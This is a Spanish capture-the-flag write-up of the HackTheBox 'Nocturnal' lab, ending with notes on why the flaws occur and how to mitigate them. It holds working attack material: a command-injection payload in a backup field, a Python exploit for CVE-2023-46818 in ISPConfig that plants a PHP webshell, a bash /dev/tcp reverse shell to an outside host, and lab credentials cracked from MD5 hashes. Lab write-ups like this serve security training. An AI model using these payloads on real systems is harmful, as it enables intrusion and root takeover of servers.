---
title: "Nocturnal — EASY (HTB)"
date: 2025-07-07 18:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, nocturnal, idor, rce, ispconfig, cve-2023-46818, linux, hashcat, ffuf, sqlite]
image: assets/img/nocturnal-easy/Nocturnal-HTB.png
toc: true
comments: true
description: "Writeup técnico y ampliado de Nocturnal (HTB). Reconocimiento, explotación (IDOR → RCE en backup → dumping SQLite), escalada a root vía CVE-2023-46818 en ISPConfig, y lecciones prácticas."
---

# Nocturnal — EASY

> Resumen rápido: explotación completa de **Nocturnal** (IP `10.10.11.64`) usando:
>
> 1. **IDOR** para descubrir archivos con credenciales temporales.
> 2. **RCE** en la función de backup que invoca comandos del shell (dump de base de datos SQLite).
> 3. Cracking de hashes (MD5) para obtener credenciales SSH (`tobias`).
> 4. Port-forwarding + acceso al panel ISPConfig y **CVE-2023-46818** para plantar una webshell y obtener **root**.
>
> Fecha del ejercicio: 20-04-2025 — Máquina resuelta.

---

## Índice

* Reconocimiento (nmap, whatweb, hosts)
* Enumeración web y fuzzing (ffuf)
* IDOR: ver archivos ajenos y encontrar credenciales temporales
* Explotación RCE en la función de backup (cómo y por qué)
* Dumping de la base de datos SQLite y cracking de hashes
* Acceso inicial (SSH a `tobias`)
* Escalada a root: descubrimiento de servicio local, port-forward, ISPConfig
* Explotación CVE-2023-46818 (inyección PHP en `language_edit.php`) → webshell → root
* Lecciones aprendidas y mitigaciones
* Herramientas & referencias

---

## 1. Reconocimiento

Empezamos con un scan “full ports” para no perdernos sorpresas:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oN Scan_Inicial.txt
```

Salida relevante (puertos abiertos): `22/tcp (ssh)` y `80/tcp (http nginx 1.18.0)`. El host responde y además el virtual-host apunta a `nocturnal.htb`.

Hicimos un escaneo más enfocado:

```bash
nmap 10.10.11.64 -p 22,80 -sCV --min-rate 5000 -oN Scan_Ports.txt
```

Resultado: nginx 1.18.0 (Ubuntu) y OpenSSH 8.2p1. Con esa información agregamos el dominio a `/etc/hosts` para que las peticiones web resuelvan correctamente:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

![hosts](/assets/img/nocturnal-easy/Pasted%20image%2020250823145354.png)

Haciendo `whatweb` confirmamos que la web usa PHP y que hay un contacto `support@nocturnal.htb`:

```bash
whatweb http://nocturnal.htb/
```

---

## 2. Enumeración web y fuzzing

Al abrir la web vemos registro/login y la capacidad de **subir archivos** (upload). Subimos un `test.pdf` de prueba para observar comportamiento.

![signup](/assets/img/nocturnal-easy/Pasted%20image%2020250823150058.png)
![upload](/assets/img/nocturnal-easy/Pasted%20image%2020250823150323.png)

El endpoint de visualización acepta parámetros `username` y `file`, lo que sugiere una posible **IDOR** (Insecure Direct Object Reference). Es decir: si el nombre de usuario viene en la URL como parámetro podemos enumerar otros usuarios y sus archivos.

Fuzzing rápido a `view.php` con un wordlist grande para hallar usuarios que devolvieran tamaño distinto (indicador de archivo real):

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' \
-w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-mc 200 -fr "User not found." \
-H "Cookie: PHPSESSID=[REDACTED]"
```

De entre muchos usuarios, `amanda` destacó por devolver un tamaño de respuesta distinto:

```
amanda  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms]
```

Accediendo directamente confirmamos que `amanda` tiene un archivo PDF con texto útil.

```
http://nocturnal.htb/view.php?username=amanda&file=*.pdf
```

![amanda-file](/assets/img/nocturnal-easy/Pasted%20image%2020250823151939.png)

---

## 3. IDOR → Credenciales temporales

Dentro del `.odt`/`.pdf` (dependiendo del contenido del archivo, extraído con `strings` o abriendo el ODT internamente) encontramos una **contraseña temporal** puesta por el equipo de TI:

```text
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services...
```

Con esa contraseña probamos login en la web con el usuario `amanda` y accedimos a un panel administrativo con un botón para generar un backup.

![amanda-login](/assets/img/nocturnal-easy/Pasted%20image%2020250823152439.png)
![admin-panel](/assets/img/nocturnal-easy/Pasted%20image%2020250823152636.png)
![backup-button](/assets/img/nocturnal-easy/Pasted%20image%2020250823152628.png)

---

## 4. Explotación: RCE en la función de backup (por qué funciona)

**Qué vimos:** la acción de “crear backup” hace una petición `POST /admin.php` donde el parámetro `password` se inyecta en una llamada del sistema sin un saneado adecuado. En otras palabras, el contenido del campo `password` termina ejecutándose en una shell por parte del servidor web. Eso es RCE.

**Intercepto con Burp** la petición del backup para confirmarlo:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
...
password=%0Abash%09-c%09"whoami"%0A&backup=
```

El payload URL-encoded incluye una nueva línea + comando `bash -c "whoami"`. La respuesta muestra que el comando se ejecuta como `www-data`:

![whoami-www-data](/assets/img/nocturnal-easy/Pasted%20image%2020250823154821.png)

**Explicación técnica:** si el servidor hace algo parecido a `system("backup_tool $password ...")` y no escapa ni valida `$password`, incluir `\n` y un `bash -c` permite terminar la línea y ejecutar comandos arbitrarios. Es básico y clásico: entrada nunca confiable => ejecución remota.

---

## 5. Dumping SQLite y extracción de hashes

Con RCE ejecutamos `sqlite3 /var/www/nocturnal_database/nocturnal_database.db .dump` para sacar el contenido de la BD:

Payload (URL-encoded para el campo `password`):

```
password=%0Abash%09-c%09"sqlite3%20/var/www/nocturnal_database/nocturnal_database.db%20.dump"%0A&backup=
```

Obtenemos inserts con usuarios y hashes MD5 (sí, MD5 — pésimo para almacenar contraseñas):

```sql
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
...
```

Guardamos todos los hashes en `hash.txt` (un hash por línea) y crackeamos con `hashcat` (modo 0 = MD5) usando `rockyou`:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado: la contraseña de `tobias` fue encontrada:

```
55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse
```

---

## 6. Acceso inicial: SSH a `tobias`

Usamos las credenciales `tobias:slowmotionapocalypse` para conectar por SSH:

```bash
ssh tobias@10.10.11.64
```

En el home de `tobias` existe `user.txt` → objetivo de user obtenido:

```bash
tobias@nocturnal:~$ ls
user.txt
```

(Flag `user.txt` leído). Buen avance.

---

## 7. Escalada de privilegios: descubrimiento de servicio local y port-forward

Desde la cuenta `tobias` buscamos servicios escuchando sólo en `127.0.0.1` (puertos locales). `ss -ltnp`/`netstat` muestra un servicio escuchando en `127.0.0.1:8080` (no expuesto públicamente).

![ss-listen](/assets/img/nocturnal-easy/Pasted%20image%2020250824175250.png)

Idea: usar SSH local-forward para mapear `127.0.0.1:8080` del target a `localhost:9001` en nuestra máquina:

```bash
ssh -L 9001:127.0.0.1:8080 tobias@10.10.11.64
```

Abrimos `http://localhost:9001` y encontramos un panel de **ISPConfig** (interfaz de administración de hosting). Login aceptó `admin:slowmotionapocalypse` (reutilización de credenciales encontrada antes). Esto nos da acceso a un panel con privilegios administrativos.

![login-ispconfig](/assets/img/nocturnal-easy/Pasted%20image%2020250824175721.png)
![ispconfig-home](/assets/img/nocturnal-easy/Pasted%20image%2020250824180044.png)

---

## 8. CVE-2023-46818 — Inyección PHP en ISPConfig → root

**Contexto:** ISPConfig ≤ 3.2.11 (con `admin_allow_langedit` habilitado) tiene una vulnerabilidad en `/admin/language_edit.php`. El parámetro `records[]` no se sanitiza correctamente y permite inyectar *PHP* en los archivos de idioma, lo que puede llevar a ejecución de código con los privilegios del proceso web. En muchas instalaciones esto corre como root o el proceso tiene permiso para escribir en directorios que derivan en ejecución con privilegios elevados.

Confirmamos versión vulnerable: `ISPConfig Version: 3.2.10p1` (vulnerable).

![ispconfig-version](/assets/img/nocturnal-easy/Pasted%20image%2020250824180204.png)

### Exploit (resumen del script usado)

* Login al panel admin.
* Navegar a `/admin/language_edit.php` para obtener tokens CSRF.
* Enviar un `POST` con `records[\]` con payload que escribe `sh.php` (webshell) en `/admin/`.
* Llamar a `/admin/sh.php?c=id` para confirmar ejecución.

Script (simplificado):

```python
#!/usr/bin/env python3
import requests, re, sys, base64
requests.packages.urllib3.disable_warnings()

URL, USER, PW = sys.argv[1:4]
if not URL.endswith('/'): URL += '/'
s = requests.Session(); s.verify = False

# Login
r = s.post(URL+'login/', data={'username':USER,'password':PW,'s_mod':'login'})
if 'Username or Password wrong' in r.text: sys.exit('Login fail')

# Get CSRF tokens from language_edit
r = s.get(URL+'admin/language_edit.php', params={'lang':'en','module':'help','lang_file':'xyz.lng'})
csrf_id  = re.search(r'name="_csrf_id"\s+value="([^"]+)"', r.text)[1]
csrf_key = re.search(r'name="_csrf_key"\s+value="([^"]+)"', r.text)[1]

# Prepare webshell and inject
php = "<?php echo 'OK'; if(isset($_GET['c'])) system($_GET['c']); ?>"
inj = "'];file_put_contents('sh.php',base64_decode('{}'));die;#".format(base64.b64encode(php.encode()).decode())

data = {'lang':'en','module':'help','lang_file':'xyz.lng',
        '_csrf_id':csrf_id,'_csrf_key':csrf_key,'records[\\]':inj}
s.post(URL+'admin/language_edit.php', data=data)

# Test webshell
r = s.get(URL+'admin/sh.php', params={'c':'id'})
print(r.text)
```

Ejecución y resultado:

```bash
python3 exploit.py http://localhost:9001/ admin 'slowmotionapocalypse'
[+] Logged in
[+] Webshell planted as /admin/sh.php
[+] Command output:
 OKuid=0(root) gid=0(root) groups=0(root)
```

La salida `uid=0(root)` confirma que el proceso web ejecuta comandos como **root** → shell reversible o reverse shell nos dará root.

Probamos una reverse shell desde la webshell:

```
http://localhost:9001/admin/sh.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27
```

(En nuestro listener `nc -lvnp 4444` recibimos la shell root).

Verificamos `root.txt`:

```bash
root@nocturnal:/root# ls
root.txt
```

Flag `root.txt` obtenida → máquina totalmente comprometida.

---

## 9. ¿Por qué estos fallos ocurren? (explicación práctica)

* **IDOR**: cuando la aplicación asume que el nombre del usuario en la URL solo lo elegirá el usuario autorizado y no valida que el solicitante tenga permiso sobre ese recurso. Resultado: cualquiera que conozca (o adivine) otros IDs/usuarios puede ver recursos ajenos.
* **RCE por campo `password`**: concatenación insegura en comandos del sistema (`system`, `exec`, `shell_exec`) sin escapar. Inyectar nuevas líneas o terminadores de comando permite ejecución.
* **Almacenamiento de passwords con MD5**: MD5 es rápido y sin sal — trivial de crackear con wordlists. Debe usarse PBKDF2/Argon2/Bcrypt con salt.
* **Reutilización de contraseñas**: credenciales reutilizadas en servicios distintos amplifican el impacto del crackeo.
* **ISPConfig CVE**: edición de archivos de lenguaje sin sanitizar entradas que después se escriben en disco (y se interpretan como PHP), combinado con permisos de archivos incorrectos, da ejecución a nivel root.

Happy hacking :)
